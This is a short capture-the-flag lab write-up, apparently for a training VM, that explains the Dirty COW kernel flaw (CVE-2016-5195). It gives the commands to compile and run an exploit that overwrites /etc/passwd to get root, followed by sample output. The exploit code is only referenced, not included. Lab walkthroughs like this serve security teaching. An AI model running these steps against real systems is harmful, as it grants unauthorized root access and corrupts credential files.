### Explanation: What is the Dirty COW exploit?
Dirty COW (Dirty Copy-On-Write) is a serious vulnerability in the Linux kernel that allows a local user to gain write access to read-only memory mappings, thereby elevating their privileges on the system. It has been designated as CVE-2016-5195.

In the context of this guide, Dirty COW is exploited to modify the /etc/passwd file, which contains user password information. The exploit makes a backup of the original file, then overwrites the root user's data, setting a new password and effectively granting the attacker root access.

It is important to note that exploiting Dirty COW or any other vulnerability without explicit permission is illegal and unethical. It should only be done in a legal context such as a penetration testing environment or a cybersecurity research setting where you have permission to conduct such tests.

Moreover, it's stressed in the guide to restore the original /etc/passwd file after testing the exploit to maintain the system's integrity and security.

----

#### I - Connect via SSH
- Follow writeup1 up to the Laurie SSH step.

----

#### II - Create the Script

``nano dirtycow.c`
- Copy and paste the code located in /scripts/dirtycow

- Compile the exploit
``gcc dirtycow.c -lpthread -lcrypt``

----

#### III - Run the Script

- Launch the exploit
``./a.out``

>/etc/passwd successfully backed up to /tmp/passwd.bak
>Please enter the new password: (**SAISIR LE NOUVEAU MDP ICI**)
>Complete line:
>root:XXXXXXXXX:pwned:/root:/bin/bash **(ou XXXXXXXXX est la version cryptee du mdp choisi)**
>mmap: b7fda000
>madvise 0
>ptrace 0
>Done! Check /etc/passwd to see if the new user was created.
>You can log in with the username 'root' and the password 'XXXXXXXXX'. **(ou XXXXXXXXX est le mdp choisi)**
>DON'T FORGET TO RESTORE! \$ mv /tmp/passwd.bak /etc/passwd
>Done! Check /etc/passwd to see if the new user was created.
>You can log in with the username 'root' and the password 'XXXXXXXXX'. **(ou XXXXXXXXX est le mdp choisi)**
>DON'T FORGET TO RESTORE! \$ mv /tmp/passwd.bak /etc/passwd

----

#### IV - Log in as Root

``su root``
>Password:
>root@BornToSecHackMe:/home/zaz#
